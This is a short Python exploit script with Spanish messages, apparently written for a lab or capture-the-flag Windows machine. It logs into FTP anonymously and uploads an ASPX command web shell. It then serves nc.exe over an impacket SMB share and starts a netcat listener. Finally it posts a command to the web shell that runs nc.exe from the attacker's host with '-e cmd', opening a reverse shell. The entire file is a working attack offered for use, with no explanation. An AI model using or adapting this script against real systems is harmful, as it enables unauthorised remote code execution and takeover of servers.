#!/usr/bin/python3

import ftplib
import requests
import subprocess

print("[+] Conectando servidor FTP...")
ftp = ftplib.FTP('10.10.10.5')
ftp.login('anonymous', 'password')

print("[+] Conectado!\n")


print("[+] Subiendo shell a pagina web por FTP..")
#shell = /usr/share/davtest/backdoors/aspx_cmd.aspx
file = open('/usr/share/davtest/backdoors/aspx_cmd.aspx', 'rb')
ftp.storbinary('STOR aspx_cmd.aspx', file)

print("[+] Listo! Ubicacion de la shell: http://10.10.10.5/aspx_cmd.aspx\n")

print("[+] Estableciendo una reverse shell...")

subprocess.call('cp /usr/share/windows-resources/binaries/nc.exe .', shell=True)
subprocess.call('impacket-smbserver nc . > /dev/null 2>&1 &', shell=True)
subprocess.call('x-terminal-emulator -e nc -lvp 443 > /dev/null 2>&1 &', shell=True)
command = { 
	"__VIEWSTATE" : "/wEPDwULLTE2MjA0MDg4ODhkZPHP3loXCnTKZCT+Q7zR035xHsl+",
	'__EVENTVALIDATION' : "/wEWAwLP0Z2EDQKa++KPCgKBwth5bI/XyH9dVQWVHOaGXvCY9VitYn8=",
	'txtArg' : "\\\\10.10.14.30\\nc\\nc.exe -e cmd 10.10.14.30 443",
	'testing' : "excute"
}		
r = requests.post('http://10.10.10.5/aspx_cmd.aspx', data=command)

print("[+] Shell TERMINADA! GRACIAS POR USAR NUESTRO PROGRAMA!")
subprocess.call('fuser -k 445/tcp > /dev/null 2>&1 2>/dev/null', shell=True)
